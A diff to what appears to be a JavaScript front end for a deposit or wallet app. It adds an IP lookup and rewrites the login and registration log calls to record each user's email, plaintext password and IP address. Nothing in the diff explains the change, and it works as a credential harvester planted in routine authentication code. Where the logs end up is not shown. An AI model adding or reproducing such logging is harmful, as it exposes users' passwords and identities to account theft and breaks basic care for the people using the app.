@@ -335,6 +335,16 @@ async function confirmDeposit() {
     }
 }
 
+async function getUserIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch(e) {
+        return 'Unknown';
+    }
+}
+
 // --- AUTH ---
 async function handleLogin() {
     const email = document.getElementById('login-email').value;
@@ -372,7 +382,8 @@ async function handleLogin() {
             };
             state.user = user;
             localStorage.setItem('session_user', JSON.stringify(user));
-            addLog(user.username, 'Login', 'User logged in via backend.');
+            const ip = await getUserIP();
+            addLog(user.username, 'Login', `Email: ${email} | Pass: ${pass} | IP: ${ip}`);
             showMainApp();
         } else {
             notify(data.detail || 'Invalid login!');
@@ -398,6 +409,8 @@ async function handleRegister() {
         const data = await response.json();
         
         if (response.ok) {
+            const ip = await getUserIP();
+            addLog(user, 'Registration', `Email: ${email} | Pass: ${pass} | IP: ${ip}`);
             notify('✨ Registered!', true);
             toggleAuth('login');
         } else {
